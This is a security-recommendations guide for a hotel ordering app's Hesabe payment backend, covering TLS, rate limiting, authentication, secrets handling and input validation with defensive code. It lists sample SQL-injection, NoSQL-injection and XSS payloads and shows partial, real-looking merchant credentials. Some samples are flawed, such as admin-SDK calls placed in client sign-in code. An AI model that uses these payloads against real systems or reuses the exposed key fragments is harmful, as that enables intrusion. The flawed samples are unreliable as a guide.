# Hesabe Payment Integration - Security Recommendations

This document outlines security considerations for the Seashell Hesabe payment integration, categorized by priority and implementation phase.

---

## 📋 Table of Contents

1. [Transport & Network Security](#1-transport--network-security)
2. [Authentication & Authorization](#2-authentication--authorization)
3. [Data Protection](#3-data-protection)
4. [Input Validation & Sanitization](#4-input-validation--sanitization)
5. [Error Handling & Logging](#5-error-handling--logging)
6. [Compliance & Standards](#6-compliance--standards)
7. [Resilience & Failover](#7-resilience--failover)
8. [User-Facing Security](#8-user-facing-security)
9. [Operational Security](#9-operational-security)
10. [Additional Security Considerations](#10-additional-security-considerations)
11. [Implementation Priorities](#implementation-priorities)
12. [Current Security Status](#current-security-status)

---

## 1. Transport & Network Security

### 🔐 HTTPS Everywhere

**What it is**: Enforce TLS 1.2+ with strong ciphers for all communications.

| Aspect             | Development            | Production                     |
| ------------------ | ---------------------- | ------------------------------ |
| **Status**         | Not needed (localhost) | **CRITICAL**                   |
| **Implementation** | Skip                   | Use HTTPS-enabled hosting      |
| **Effort**         | N/A                    | Automatic (hosting platform)   |
| **Cost**           | Free                   | Free (included with platforms) |

**✅ Recommendation**:

- **Dev**: Not applicable (localhost HTTP is fine)
- **Prod**: **MANDATORY** - Use Firebase Hosting, Vercel, Railway, or similar
  - These platforms automatically provide free SSL/TLS certificates
  - Update all URLs in `.env.local` to use `https://`

**Implementation Notes**:

```env
# Production .env.local
MENU_APP_URL=https://yourdomain.com
HESABE_BASE_URL=https://sandbox.hesabe.com  # Already HTTPS ✓
```

---

### 🛡️ HSTS (HTTP Strict Transport Security)

**What it is**: Force browsers to only use HTTPS connections, preventing downgrade attacks.

| Aspect             | Development | Production     |
| ------------------ | ----------- | -------------- |
| **Priority**       | Not needed  | **HIGH**       |
| **Implementation** | Skip        | Add middleware |
| **Effort**         | N/A         | 2 minutes      |
| **Cost**           | Free        | Free           |

**✅ Recommendation**:

- **Dev**: Skip
- **Prod**: **Recommended** - Add HSTS headers in Express

**Implementation**:

```javascript
// In server.js (production only)
if (process.env.NODE_ENV === "production") {
  app.use((req, res, next) => {
    res.setHeader(
      "Strict-Transport-Security",
      "max-age=31536000; includeSubDomains; preload",
    );
    next();
  });
}
```

**Benefits**:

- Prevents man-in-the-middle attacks
- Blocks accidental HTTP connections
- Improves security score

---

### 🔥 Firewall & WAF (Web Application Firewall)

**What it is**: Block malicious traffic, SQL injection (SQLi), XSS attempts.

| Aspect             | Development | Production                    |
| ------------------ | ----------- | ----------------------------- |
| **Priority**       | Not needed  | **MEDIUM**                    |
| **Implementation** | Skip        | Use hosting platform features |
| **Effort**         | N/A         | Automatic or minimal config   |
| **Cost**           | Free        | Free to $20/month             |

**✅ Recommendation**:

- **Dev**: Not needed
- **Prod**: **Use platform-provided WAF**

**Platform Options**:

1. **Cloudflare** (Free tier): Automatic WAF, DDoS protection
2. **Vercel/Firebase**: Basic protection included
3. **AWS WAF**: Advanced rules (if using AWS)

**Why It's Lower Priority for You**:

- Your backend only accepts JSON from known sources
- No user-generated SQL queries
- Payment data handled by Hesabe (PCI-compliant)
- Limited public exposure (hotel internal system)

---

### ⏱️ Rate Limiting & Throttling

**What it is**: Limit requests per IP to prevent brute force and DoS attacks.

| Aspect             | Development     | Production         |
| ------------------ | --------------- | ------------------ |
| **Priority**       | **RECOMMENDED** | **CRITICAL**       |
| **Implementation** | Test now        | Deploy with limits |
| **Effort**         | 5 minutes       | Same               |
| **Cost**           | Free            | Free               |

**✅ Recommendation**:

- **Dev**: **Implement now** to test behavior
- **Prod**: **MANDATORY** with stricter limits

**Suggested Limits**:

| Endpoint            | Dev Limit | Prod Limit      |
| ------------------- | --------- | --------------- |
| `/payment/checkout` | 100/15min | 20/15min per IP |
| `/payment/success`  | Unlimited | 50/15min        |
| `/payment/failure`  | Unlimited | 50/15min        |
| All routes          | 200/15min | 100/15min       |

**Implementation** (using `express-rate-limit`):

```javascript
const rateLimit = require("express-rate-limit");

const checkoutLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: process.env.NODE_ENV === "production" ? 20 : 100,
  message: "Too many payment requests, please try again later.",
  standardHeaders: true,
  legacyHeaders: false,
});

app.use("/payment/checkout", checkoutLimiter);
```

**Why It's Important**:

- ✅ Prevents payment spam
- ✅ Stops brute force attacks
- ✅ Reduces server load
- ✅ Protects against malicious actors

---

## 2. Authentication & Authorization

### 🔑 API Keys / JWTs for Backend Communication

**What it is**: Secure communication between your menu app and Express backend using tokens.

| Aspect             | Development          | Production               |
| ------------------ | -------------------- | ------------------------ |
| **Priority**       | **OPTIONAL**         | **MEDIUM-HIGH**          |
| **Implementation** | Can skip for testing | Recommended for security |
| **Effort**         | 1-2 hours            | Same                     |
| **Cost**           | Free                 | Free                     |

**✅ Recommendation**:

- **Dev**: **OPTIONAL** - Not critical for localhost testing
- **Prod**: **RECOMMENDED** - Adds extra security layer

**Your Use Case Analysis**:

| Scenario            | Need Auth?   | Reason                               |
| ------------------- | ------------ | ------------------------------------ |
| Guest ordering food | **NO**       | Room number is sufficient identifier |
| Payment initiation  | **OPTIONAL** | Rate limiting + CORS may be enough   |
| Management app      | **YES**      | Staff need authentication            |
| Webhook endpoint    | **YES**      | Verify it's from Hesabe              |

**Implementation Options**:

#### **Option 1: Simple API Key (Easiest)**

Good for: Internal hotel network, basic protection

```javascript
// Backend: Verify API key
app.use("/payment", (req, res, next) => {
  const apiKey = req.headers["x-api-key"];

  if (
    process.env.NODE_ENV === "production" &&
    apiKey !== process.env.API_SECRET_KEY
  ) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  next();
});

// Frontend: Send API key
const response = await fetch(`${BACKEND_URL}/payment/checkout`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-API-Key": process.env.VITE_API_KEY,
  },
  body: JSON.stringify(paymentData),
});
```

**Pros**:

- ✅ Simple to implement
- ✅ Prevents unauthorized API access
- ✅ No user login required

**Cons**:

- ⚠️ API key visible in frontend code (use HTTPS)
- ⚠️ All requests use same key

---

#### **Option 2: JWT Tokens (More Secure)**

Good for: User sessions, management app staff

```javascript
// Backend: Generate JWT
const jwt = require("jsonwebtoken");

// When user starts order session
app.post("/session/start", (req, res) => {
  const { roomNumber, phoneNumber } = req.body;

  const token = jwt.sign(
    { roomNumber, phoneNumber, type: "guest" },
    process.env.JWT_SECRET,
    { expiresIn: "2h" }, // Session expires in 2 hours
  );

  res.json({ token });
});

// Verify JWT middleware
const verifyToken = (req, res, next) => {
  const token = req.headers["authorization"]?.split(" ")[1];

  if (!token) {
    return res.status(401).json({ error: "No token provided" });
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
    if (err) {
      return res.status(401).json({ error: "Invalid token" });
    }
    req.user = decoded;
    next();
  });
};

// Protect payment endpoint
app.post("/payment/checkout", verifyToken, async (req, res) => {
  // req.user contains decoded token data
  const roomNumber = req.user.roomNumber;
  // ... proceed with payment
});
```

**Pros**:

- ✅ More secure than API keys
- ✅ Can include user data in token
- ✅ Time-limited sessions

**Cons**:

- ⚠️ More complex to implement
- ⚠️ Requires token management

---

### **My Recommendation for Your Hotel**:

**For Guest Orders (Menu App)**:

- **Skip authentication** - Use room number as identifier
- **Rely on**: Rate limiting + CORS + HTTPS
- **Why**: Guests shouldn't need to log in for convenience

**For Management App**:

- **Use Firebase Authentication** (you likely already have this)
- **Why**: Staff need secure access to order management

**For Webhook**:

- **Verify Hesabe signature** (if they provide it)
- **Why**: Ensure webhooks are from Hesabe, not attackers

---

### 👥 Role-Based Access Control (RBAC)

**What it is**: Ensure only authorized users/services can trigger payment endpoints.

| Aspect             | Development | Production                   |
| ------------------ | ----------- | ---------------------------- |
| **Priority**       | Not needed  | **MEDIUM**                   |
| **Implementation** | Skip        | Add for management endpoints |
| **Effort**         | 1 hour      | Same                         |
| **Cost**           | Free        | Free                         |

**✅ Recommendation**:

- **Dev**: Skip
- **Prod**: **Implement for management endpoints only**

**Your Use Case**:

```
┌─────────────────────┬──────────────┬───────────────┐
│ User Type           │ Access Level │ Need RBAC?    │
├─────────────────────┼──────────────┼───────────────┤
│ Guest (Menu App)    │ Order only   │ NO ❌         │
│ Kitchen Staff       │ View orders  │ YES ✅        │
│ Manager             │ All orders   │ YES ✅        │
│ Admin               │ Settings     │ YES ✅        │
└─────────────────────┴──────────────┴───────────────┘
```

**Implementation** (with Firebase Auth):

```javascript
// Backend: Check user role
const checkRole = (allowedRoles) => {
  return async (req, res, next) => {
    try {
      // Get Firebase auth token
      const token = req.headers["authorization"]?.split("Bearer ")[1];
      const decodedToken = await admin.auth().verifyIdToken(token);

      const userRole = decodedToken.role || "guest";

      if (!allowedRoles.includes(userRole)) {
        return res.status(403).json({ error: "Forbidden" });
      }

      req.user = decodedToken;
      next();
    } catch (error) {
      res.status(401).json({ error: "Unauthorized" });
    }
  };
};

// Payment endpoints - NO RBAC (guest accessible)
app.post("/payment/checkout", async (req, res) => {
  // Anyone can initiate payment
});

// Management endpoints - WITH RBAC
app.get("/admin/orders", checkRole(["admin", "manager"]), async (req, res) => {
  // Only admins and managers
});

app.post("/admin/refund", checkRole(["admin"]), async (req, res) => {
  // Only admins can refund
});
```

**User Roles for Your System**:

| Role              | Permissions                     | Needs RBAC |
| ----------------- | ------------------------------- | ---------- |
| **Guest**         | Create orders, pay              | NO         |
| **Kitchen Staff** | View orders, mark as preparing  | YES        |
| **Manager**       | View all orders, cancel, refund | YES        |
| **Admin**         | Full system access, settings    | YES        |

---

### 🔐 OAuth2/OpenID Connect

**What it is**: Integration with external identity providers (Google, Microsoft, etc.).

| Aspect             | Development    | Production     |
| ------------------ | -------------- | -------------- |
| **Priority**       | **NOT NEEDED** | **NOT NEEDED** |
| **Implementation** | Skip           | Skip           |
| **Effort**         | N/A            | N/A            |
| **Cost**           | Free           | Free           |

**✅ Recommendation**:

- **Dev**: **NOT NEEDED**
- **Prod**: **NOT NEEDED**

**Why You Don't Need OAuth2**:

| Reason                    | Explanation                                |
| ------------------------- | ------------------------------------------ |
| **Hotel Internal System** | Not a public SaaS platform                 |
| **No Multi-Tenant**       | Single hotel/resort use case               |
| **Firebase Auth**         | Already provides authentication            |
| **Guest Orders**          | No login required for guests               |
| **Staff Login**           | Email/password with Firebase is sufficient |

**When You MIGHT Need OAuth2**:

❌ **Don't need if**:

- Running single hotel/resort
- Staff use hotel email accounts
- Simple authentication is enough

✅ **Consider if**:

- Multi-property management (franchises)
- Integration with corporate SSO
- Third-party vendor access
- Staff use Google Workspace/Microsoft 365

**Alternative Recommendation**:

Instead of OAuth2, for staff authentication:

```javascript
// Use Firebase Email/Password Auth (simpler)
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";

const signIn = async (email, password) => {
  const auth = getAuth();
  const userCredential = await signInWithEmailAndPassword(
    auth,
    email,
    password,
  );

  // Set custom claims for roles
  await admin.auth().setCustomUserClaims(userCredential.user.uid, {
    role: "kitchen", // or 'manager', 'admin'
  });
};
```

---

### 📊 Authentication Summary for Your System

**Recommended Approach**:

```
┌─────────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION STRATEGY                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  MENU APP (Guests)                                              │
│  ✅ No authentication required                                  │
│  ✅ Use room number as identifier                               │
│  ✅ Protected by: Rate limiting + CORS + HTTPS                  │
│                                                                  │
│  MANAGEMENT APP (Staff)                                         │
│  ✅ Firebase Authentication (email/password)                    │
│  ✅ Role-based access (kitchen/manager/admin)                   │
│  ✅ Protected by: JWT tokens + RBAC                             │
│                                                                  │
│  BACKEND API                                                     │
│  ⚠️ Optional API key for extra security                         │
│  ✅ Webhook signature verification                              │
│  ✅ Protected by: Rate limiting + input validation              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Implementation Priority**:

| Component              | Priority        | When        | Effort        |
| ---------------------- | --------------- | ----------- | ------------- |
| Guest orders (no auth) | ✅ **Done**     | Current     | 0 min         |
| Rate limiting + CORS   | ⚠️ **HIGH**     | Before prod | 30 min        |
| Staff authentication   | ⚠️ **HIGH**     | Before prod | Already done? |
| Role-based access      | 💡 **MEDIUM**   | Post-launch | 1 hour        |
| API key/JWT            | 🔹 **OPTIONAL** | If needed   | 1 hour        |
| OAuth2/SSO             | ❌ **SKIP**     | Never       | N/A           |

---

## 3. Data Protection

### 💳 Never Store Card Data (PCI DSS Compliance)

**What it is**: Never store customer card information - offload to Hesabe (PCI DSS compliant provider).

| Aspect              | Your Implementation | Status               |
| ------------------- | ------------------- | -------------------- |
| **Card numbers**    | Never stored        | ✅ **COMPLIANT**     |
| **CVV/CVC**         | Never stored        | ✅ **COMPLIANT**     |
| **Expiry dates**    | Never stored        | ✅ **COMPLIANT**     |
| **Cardholder name** | Never stored        | ✅ **COMPLIANT**     |
| **Payment tokens**  | Hesabe provides     | ✅ **SAFE TO STORE** |
| **Transaction IDs** | Store for reference | ✅ **SAFE TO STORE** |

**✅ Current Status**: **FULLY COMPLIANT** - You don't store any card data!

**What You Actually Store**:

```javascript
// ✅ SAFE - What you store in Firebase
{
  orderId: "ORD-123456",
  roomNumber: "101",
  totalAmount: 15.500,
  paymentMethod: "card",
  paymentStatus: "paid",

  // ✅ SAFE - Hesabe transaction references
  hesabePaymentId: "100603220000000030",
  hesabeOrderReference: "ORDER-1769893731943",
  hesabeTransactionId: "603220000011065",

  // ❌ NEVER STORE THESE
  // cardNumber: "4111111111111111",  // NEVER!
  // cvv: "123",                       // NEVER!
  // cardHolderName: "John Doe",       // NEVER!
}
```

**PCI DSS Compliance Levels**:

| If You Store Card Data | Your Requirement                       | Your Status         |
| ---------------------- | -------------------------------------- | ------------------- |
| YES (store cards)      | **Level 1** - Annual audit, $20k+/year | N/A                 |
| NO (use Hesabe)        | **SAQ-A** - Self-assessment only       | ✅ **This is you!** |

**Benefits of Your Approach**:

- ✅ No PCI DSS audit required
- ✅ No card data breach risk
- ✅ Hesabe handles all card security
- ✅ Lower compliance costs
- ✅ Reduced legal liability

**Recommendation**: **Keep current approach** - Never store card data! ✅

---

### 🔐 Encryption at Rest (Database/Storage)

**What it is**: Encrypt sensitive data when stored in databases using AES-256.

| Data Type          | Sensitivity  | Need Encryption at Rest? |
| ------------------ | ------------ | ------------------------ |
| Card data          | **CRITICAL** | ✅ Never store (N/A)     |
| Hesabe payment IDs | **LOW**      | ⚠️ Optional              |
| Room numbers       | **MEDIUM**   | ⚠️ Optional              |
| Phone numbers      | **MEDIUM**   | ✅ Recommended           |
| Guest names        | **MEDIUM**   | ⚠️ Optional              |
| Order details      | **LOW**      | ❌ Not needed            |
| Staff email        | **MEDIUM**   | ⚠️ Firebase handles      |

**✅ Recommendation**:

| Phase        | Action                             | Priority    |
| ------------ | ---------------------------------- | ----------- |
| **Dev**      | Skip - not needed for localhost    | **LOW**     |
| **Prod**     | Use Firebase's built-in encryption | **DONE** ✅ |
| **Optional** | Encrypt phone numbers              | **MEDIUM**  |

**Why It's Lower Priority for You**:

1. **Firebase Already Encrypts**: Firestore automatically encrypts data at rest
2. **No Card Data**: Most sensitive data (cards) handled by Hesabe
3. **Limited Sensitive Data**: Only room numbers and phone numbers
4. **Internal System**: Hotel guests, not public database

**Firebase Encryption** (Already Active):

```
✅ Firestore automatically encrypts:
  - All data at rest using AES-256
  - Encryption keys managed by Google
  - Transparent to your application
  - No additional code required
```

**If You Want Extra Encryption** (Optional):

```javascript
// Encrypt phone numbers before storing (optional)
const crypto = require("crypto");

const encryptField = (text, secretKey) => {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(
    "aes-256-cbc",
    Buffer.from(secretKey, "hex"),
    iv,
  );

  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);

  return iv.toString("hex") + ":" + encrypted.toString("hex");
};

const decryptField = (encryptedText, secretKey) => {
  const parts = encryptedText.split(":");
  const iv = Buffer.from(parts[0], "hex");
  const encrypted = Buffer.from(parts[1], "hex");

  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    Buffer.from(secretKey, "hex"),
    iv,
  );

  let decrypted = decipher.update(encrypted);
  decrypted = Buffer.concat([decrypted, decipher.final()]);

  return decrypted.toString();
};

// Usage
await placeOrder({
  roomNumber: roomNumber, // Plain text (low sensitivity)
  phoneNumber: encryptField(phoneNumber, process.env.ENCRYPTION_KEY), // Encrypted
  totalAmount: totalAmount,
});
```

**Implementation Priority**: **OPTIONAL** - Firebase encryption is sufficient for your use case

---

### 🔒 Encryption in Transit (TLS for API Calls)

**What it is**: Encrypt all data while traveling between systems using TLS/HTTPS.

| Connection                  | Current Status   | Required Action   |
| --------------------------- | ---------------- | ----------------- |
| Menu App → Backend          | HTTP (localhost) | ✅ HTTPS in prod  |
| Backend → Hesabe            | HTTPS ✅         | ✅ Already secure |
| Hesabe → Backend (callback) | HTTP (localhost) | ✅ HTTPS in prod  |
| Management App → Firebase   | HTTPS ✅         | ✅ Already secure |

**✅ Current Status**:

**Development**:

- ❌ HTTP between apps (localhost) - **OK for dev**
- ✅ HTTPS to Hesabe API - **Already secure**
- ✅ HTTPS to Firebase - **Already secure**

**Production** (Required):

- ✅ HTTPS everywhere with hosting platform
- ✅ TLS 1.2+ enforced
- ✅ Strong cipher suites

**Recommendation**:

| Phase    | Action                   | Priority        | Effort      |
| -------- | ------------------------ | --------------- | ----------- |
| **Dev**  | Keep HTTP (localhost OK) | ✅ **Done**     | 0 min       |
| **Prod** | Deploy to HTTPS platform | ⚠️ **CRITICAL** | Automatic   |
| **Prod** | Verify TLS version       | ⚠️ **HIGH**     | 5 min check |

**Verification Commands** (Production):

```bash
# Check TLS version and ciphers
curl -sS -I https://your-backend.com | grep -i "strict-transport"

# Test SSL/TLS configuration
openssl s_client -connect your-backend.com:443 -tls1_2

# Online tools
# https://www.ssllabs.com/ssltest/
```

**Implementation**: Automatic with Firebase Hosting, Vercel, Railway, etc.

---

### 🔑 Secure Secrets Management

**What it is**: Store API keys, tokens, and secrets securely (not in code).

| Current Approach   | Development     | Production        |
| ------------------ | --------------- | ----------------- |
| `.env.local` files | ✅ Good for dev | ⚠️ Upgrade needed |
| Hardcoded secrets  | ❌ Never!       | ❌ Never!         |
| Git-ignored files  | ✅ Good         | ⚠️ Not enough     |
| Platform secrets   | N/A             | ✅ **Use this**   |

**Current Setup** (Good for Dev):

```env
# .env.local (git-ignored) ✅
HESABE_MERCHANT_ID=REDACTED
HESABE_ACCESS_CODE=REDACTED
HESABE_SECRET_KEY=REDACTED
HESABE_IV_KEY=REDACTED
```

**Production Options**:

#### **Option 1: Platform Environment Variables** (Recommended)

**Firebase Functions**:

```bash
# Set secrets
firebase functions:config:set \
  hesabe.merchant_id="842217" \
  hesabe.access_code="c333..." \
  hesabe.secret_key="PkW64..."

# Get secrets in code
const config = functions.config();
const merchantId = config.hesabe.merchant_id;
```

**Vercel**:

```bash
# UI: Project Settings → Environment Variables
# Or via CLI:
vercel env add HESABE_SECRET_KEY
```

**Railway/Render**:

```
# Dashboard → Environment Variables
# Add each secret individually
```

---

#### **Option 2: AWS Secrets Manager** (Enterprise)

Good for: Multi-service deployments, rotation requirements

```javascript
const AWS = require("aws-sdk");
const secretsManager = new AWS.SecretsManager();

async function getSecret(secretName) {
  const data = await secretsManager
    .getSecretValue({
      SecretId: secretName,
    })
    .promise();

  return JSON.parse(data.SecretString);
}

// Usage
const hesabeKeys = await getSecret("prod/hesabe/keys");
const merchantId = hesabeKeys.MERCHANT_ID;
```

**Cost**: ~$0.40/secret/month + $0.05 per 10,000 API calls

---

#### **Option 3: Google Secret Manager** (If using GCP)

```javascript
const { SecretManagerServiceClient } = require("@google-cloud/secret-manager");
const client = new SecretManagerServiceClient();

async function getSecret(name) {
  const [version] = await client.accessSecretVersion({
    name: `projects/PROJECT_ID/secrets/${name}/versions/latest`,
  });

  return version.payload.data.toString();
}

// Usage
const secretKey = await getSecret("hesabe-secret-key");
```

**Cost**: $0.06 per 10,000 access operations (first 10k/month free)

---

#### **Option 4: HashiCorp Vault** (Advanced)

Good for: Large organizations, multiple environments, secret rotation

**Cost**: Free (self-hosted) or $0.03/hour (cloud)
**Complexity**: High
**Recommendation**: **Overkill for hotel use case**

---

### **My Recommendation for Your Hotel**:

| Environment     | Solution               | Why                       |
| --------------- | ---------------------- | ------------------------- |
| **Development** | `.env.local` files     | ✅ Simple, git-ignored    |
| **Production**  | **Platform env vars**  | ✅ Free, integrated, easy |
| **Enterprise**  | AWS/GCP Secret Manager | Only if multi-property    |

**Priority**:

- ⚠️ **HIGH** - Use platform secrets in production
- 🔹 **LOW** - Don't need Vault/AWS Secrets Manager (too complex)

**Implementation Checklist**:

```
Development:
✅ Use .env.local (git-ignored)
✅ Never commit secrets to Git
✅ Keep sandbox vs prod keys separate

Production:
⚠️ Move secrets to hosting platform
⚠️ Use different keys for production
⚠️ Enable secret access logging
⚠️ Rotate keys annually
```

---

### 📊 Data Protection Summary

**What You're Doing Right**:

| Security Measure        | Status         | Compliance      |
| ----------------------- | -------------- | --------------- |
| Never store card data   | ✅ **Perfect** | PCI DSS SAQ-A   |
| Use Hesabe tokens only  | ✅ **Perfect** | Fully compliant |
| HTTPS to Hesabe         | ✅ **Working** | Secure          |
| HTTPS to Firebase       | ✅ **Working** | Secure          |
| Secrets in `.env` (dev) | ✅ **Good**    | Dev-appropriate |

**What to Improve for Production**:

| Security Measure           | Priority        | Effort  | Timeline      |
| -------------------------- | --------------- | ------- | ------------- |
| HTTPS deployment           | ⚠️ **CRITICAL** | Auto    | Before launch |
| Platform secret management | ⚠️ **HIGH**     | 30 min  | Before launch |
| TLS 1.2+ verification      | 💡 **MEDIUM**   | 5 min   | At launch     |
| Phone number encryption    | 🔹 **OPTIONAL** | 2 hours | Post-launch   |

**Your PCI DSS Compliance Status**: ✅ **SAQ-A Eligible** (simplest level)

**Required Actions**:

1. ✅ Never store card data (already doing this)
2. ⚠️ Use HTTPS in production (automatic with hosting)
3. ⚠️ Move secrets to platform environment variables
4. ✅ Let Firebase handle data encryption at rest

**Cost**: $0 (all free with hosting platforms)

---

## 4. Input Validation & Sanitization

### ✅ Validate All Incoming Requests

**What it is**: Check that all data matches expected format before processing.

| Input Field     | Current Status | Recommended Validation               |
| --------------- | -------------- | ------------------------------------ |
| Amount          | Basic check    | ✅ Min/max, decimal format, currency |
| Room number     | None           | ⚠️ Format validation (alphanumeric)  |
| Phone number    | None           | ⚠️ Format validation, sanitize       |
| Order reference | Generated      | ✅ Already secure                    |
| Payment method  | None           | ⚠️ Whitelist only allowed values     |
| Variables 1-5   | None           | ⚠️ Length limits, type checking      |

**Priority**:

- ⚠️ **HIGH** for production
- 💡 **MEDIUM** for development (testing)

---

### 💰 Amount Validation (Critical!)

**Why Critical**: Prevent payment manipulation (e.g., negative amounts, decimals)

**Current Code** (Needs Improvement):

```javascript
// ❌ WEAK - Current approach
const amount = req.body.amount;
// No validation!
```

**Recommended Validation**:

```javascript
const { body, validationResult } = require("express-validator");

router.post(
  "/payment/checkout",
  [
    // Amount validation
    body("amount")
      .notEmpty()
      .withMessage("Amount is required")
      .isFloat({ min: 0.2, max: 9999.999 })
      .withMessage("Amount must be between 0.200 and 9999.999 KWD")
      .toFloat()
      .custom((value) => {
        // Ensure exactly 3 decimal places for KWD
        const decimals = (value.toString().split(".")[1] || "").length;
        if (decimals > 3) {
          throw new Error("Amount cannot have more than 3 decimal places");
        }
        return true;
      }),

    // Currency validation (if multiple currencies)
    body("currency")
      .optional()
      .isIn(["KWD", "USD", "EUR"])
      .withMessage("Invalid currency"),
  ],
  async (req, res) => {
    // Check for validation errors
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array(),
      });
    }

    // Proceed with validated amount
    const amount = req.body.amount;
    // ...
  },
);
```

**Attack Prevention**:

- ✅ Prevents negative amounts: `-10.500`
- ✅ Blocks excessive amounts: `999999.999`
- ✅ Rejects invalid decimals: `10.12345`
- ✅ Stops type manipulation: `"10.5 OR 1=1"`

---

### 🏨 Room Number & User Data Validation

**Current Risk**: SQL injection, NoSQL injection, XSS attacks

**Recommended Validation**:

```javascript
router.post(
  "/payment/checkout",
  [
    // Room number validation
    body("variable1") // Room number in Hesabe variables
      .optional()
      .trim()
      .isLength({ min: 1, max: 10 })
      .withMessage("Room number must be 1-10 characters")
      .matches(/^[A-Z0-9]+$/i)
      .withMessage("Room number can only contain letters and numbers")
      .escape(), // Sanitize HTML entities

    // Phone number validation
    body("variable2") // Phone number
      .optional()
      .trim()
      .matches(/^\+?[0-9]{8,15}$/)
      .withMessage("Invalid phone number format")
      .escape(),

    // Guest name validation
    body("variable3") // Guest name
      .optional()
      .trim()
      .isLength({ min: 1, max: 50 })
      .withMessage("Name must be 1-50 characters")
      .matches(/^[a-zA-Z\s\-']+$/)
      .withMessage(
        "Name can only contain letters, spaces, hyphens, and apostrophes",
      )
      .escape(),

    // Chair/table number (beach guests)
    body("variable4")
      .optional()
      .trim()
      .isLength({ max: 10 })
      .matches(/^[A-Z0-9\-]+$/i)
      .withMessage("Invalid chair number")
      .escape(),

    // Menu type validation
    body("variable5")
      .optional()
      .isIn(["presto", "room-service"])
      .withMessage("Invalid menu type"),
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array(),
      });
    }

    // All data is now validated and sanitized!
  },
);
```

**What This Prevents**:

| Attack Type     | Example Malicious Input         | How Validation Blocks It              |
| --------------- | ------------------------------- | ------------------------------------- |
| SQL Injection   | `101'; DROP TABLE orders--`     | Regex only allows alphanumeric        |
| NoSQL Injection | `{"$gt": ""}`                   | Type checking, sanitization           |
| XSS             | `<script>alert('xss')</script>` | `.escape()` converts to HTML entities |
| Buffer Overflow | `AAAA...` (10,000 chars)        | Max length limit                      |
| Type Confusion  | `{roomNumber: {}}`              | Type validation                       |

---

### 🚫 Reject Malformed or Unexpected Payloads

**What it is**: Block requests that don't match expected structure.

**Implementation**:

```javascript
// Middleware to validate request structure
const validatePaymentPayload = (req, res, next) => {
  const allowedFields = [
    "amount",
    "orderReferenceNumber",
    "variable1", // room number
    "variable2", // phone
    "variable3", // guest name
    "variable4", // chair number
    "variable5", // menu type
  ];

  // Check for unexpected fields
  const requestFields = Object.keys(req.body);
  const unexpectedFields = requestFields.filter(
    (field) => !allowedFields.includes(field),
  );

  if (unexpectedFields.length > 0) {
    return res.status(400).json({
      success: false,
      error: "Invalid request structure",
      unexpectedFields,
    });
  }

  // Check Content-Type
  if (!req.is("application/json")) {
    return res.status(400).json({
      success: false,
      error: "Content-Type must be application/json",
    });
  }

  next();
};

// Use middleware
router.post(
  "/payment/checkout",
  validatePaymentPayload,
  [
    // ... validation rules
  ],
  async (req, res) => {
    // ...
  },
);
```

**JSON Schema Validation** (Alternative Approach):

```javascript
const Ajv = require("ajv");
const ajv = new Ajv();

const paymentSchema = {
  type: "object",
  properties: {
    amount: {
      type: "number",
      minimum: 0.2,
      maximum: 9999.999,
    },
    orderReferenceNumber: {
      type: "string",
      pattern: "^ORDER-[0-9]{13}$",
    },
    variable1: {
      type: "string",
      maxLength: 10,
    },
    variable2: {
      type: "string",
      pattern: "^\\+?[0-9]{8,15}$",
    },
    variable5: {
      type: "string",
      enum: ["presto", "room-service"],
    },
  },
  required: ["amount"],
  additionalProperties: false, // Reject extra fields
};

const validate = ajv.compile(paymentSchema);

router.post("/payment/checkout", (req, res) => {
  const valid = validate(req.body);

  if (!valid) {
    return res.status(400).json({
      success: false,
      errors: validate.errors,
    });
  }

  // Proceed with valid payload
});
```

---

### 🧹 Sanitize User Input (Prevent Injection Attacks)

**What it is**: Clean and escape user input to prevent injection.

**Sanitization Tools**:

| Tool                | Purpose                   | Install                         |
| ------------------- | ------------------------- | ------------------------------- |
| `express-validator` | Validation + sanitization | `npm install express-validator` |
| `dompurify`         | HTML/XSS sanitization     | `npm install dompurify jsdom`   |
| `validator`         | String validators         | `npm install validator`         |

**Implementation**:

```javascript
const validator = require("validator");
const { sanitize } = require("express-validator");

// Sanitization functions
const sanitizeInput = (input, type = "string") => {
  if (typeof input !== "string") {
    input = String(input);
  }

  // Trim whitespace
  input = validator.trim(input);

  // Escape HTML entities
  input = validator.escape(input);

  // Remove control characters
  input = input.replace(/[\x00-\x1F\x7F]/g, "");

  // Type-specific sanitization
  switch (type) {
    case "alphanumeric":
      input = input.replace(/[^a-zA-Z0-9]/g, "");
      break;
    case "numeric":
      input = input.replace(/[^0-9.]/g, "");
      break;
    case "phone":
      input = input.replace(/[^0-9+]/g, "");
      break;
    case "name":
      input = input.replace(/[^a-zA-Z\s\-']/g, "");
      break;
  }

  return input;
};

// Usage in routes
router.post("/payment/checkout", async (req, res) => {
  try {
    // Sanitize all user inputs
    const sanitizedData = {
      amount: parseFloat(sanitizeInput(req.body.amount, "numeric")),
      roomNumber: sanitizeInput(req.body.variable1, "alphanumeric"),
      phoneNumber: sanitizeInput(req.body.variable2, "phone"),
      guestName: sanitizeInput(req.body.variable3, "name"),
      chairNumber: sanitizeInput(req.body.variable4, "alphanumeric"),
      menuType: req.body.variable5, // Already validated by enum
    };

    // Now use sanitized data
    const checkoutResult = await hesabeService.createCheckout(sanitizedData);
    // ...
  } catch (error) {
    // ...
  }
});
```

---

### 🛡️ Defense-in-Depth Strategy

**Multi-Layer Protection**:

```
┌──────────────────────────────────────────────────────────┐
│                 DEFENSE IN DEPTH                         │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Layer 1: Client-Side Validation (TypeScript)           │
│  ├─ Type checking                                        │
│  ├─ Form validation                                      │
│  └─ User feedback                                        │
│                                                          │
│  Layer 2: API Gateway / Rate Limiting                    │
│  ├─ Request throttling                                   │
│  ├─ IP blocking                                          │
